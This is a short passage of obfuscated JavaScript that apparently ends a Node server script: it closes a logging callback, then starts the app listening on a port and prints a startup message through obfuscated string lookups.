_0x53f860=_0x3467d1;console[_0x53f860(0x1e1)](_0x53f860(0x1c6),_0x50f4e0);}),app[_0x3467d1(0x230)](PORT,()=>console[_0x3467d1(0x1ba)](_0x3467d1(0x1e8)+PORT+'!'));
